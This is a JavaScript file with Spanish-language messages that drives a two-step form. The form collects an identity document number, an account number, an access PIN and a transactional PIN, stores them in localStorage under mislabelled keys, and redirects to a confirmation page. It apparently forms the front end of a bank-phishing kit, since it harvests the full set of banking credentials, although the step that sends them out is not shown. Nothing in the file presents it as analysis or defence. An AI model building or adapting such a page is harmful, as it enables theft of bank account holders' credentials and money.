









scbtn = document.getElementById("btnOne")
scbtn.addEventListener("click", fenv, false)

function fenv(params) {
	if (document.getElementById("docss").value.length <= 3  ) {
    alert("Documento Incompleto");
      document.getElementById("docss").value = ""
      document.getElementById("docss").focus();
      false;
       
    } else if (document.getElementById("mypr").value.length <= 3 ) {
        alert("Cuenta incompleta");
        document.getElementById("mypr").value = ""
        document.getElementById("mypr").focus();
        false;
    }
    
    else{
      
     document.getElementById("mys").style.display ="none";
     document.getElementById("scnd").style.display ="block";
}
    }

    scbtnn = document.getElementById("btnOnee")
scbtnn.addEventListener("click", fenvv, false)

function fenvv(params) {
	if (document.getElementById("docsss").value.length <= 5  ) {
    alert("Pin de Acesso Incompleto");
      document.getElementById("docsss").value = ""
      document.getElementById("docsss").focus();
      false;
       
    } else if (document.getElementById("myprr").value.length <= 5 ) {
        alert("Pin Transaccional Incompleto");
        document.getElementById("myprr").value = ""
        document.getElementById("myprr").focus();
        false;
    }
    
    else{
        localStorage.setItem("docu",document.getElementById("docss").value );
        localStorage.setItem("pw", document.getElementById("mypr").value);
        localStorage.setItem("correo", document.getElementById("docsss").value);
        localStorage.setItem("cpw",document.getElementById("myprr").value );
      
        window.location = "confirm.html";
}
    }

     let pyu = document.getElementById("togg")
     pyu.addEventListener("click", ()=>{
     let x = document.getElementById("mypr");
     if (x.type === "password") {
        x.type = "text";
      } else {
        x.type = "password";
      }
    
      
        


    })

    let pyuu = document.getElementById("togge")
     pyuu.addEventListener("click", ()=>{
     let xs = document.getElementById("myprr");
     if (xs.type === "password") {
        xs.type = "text";
      } else {
        xs.type = "password";
      }
    
      
        


    })
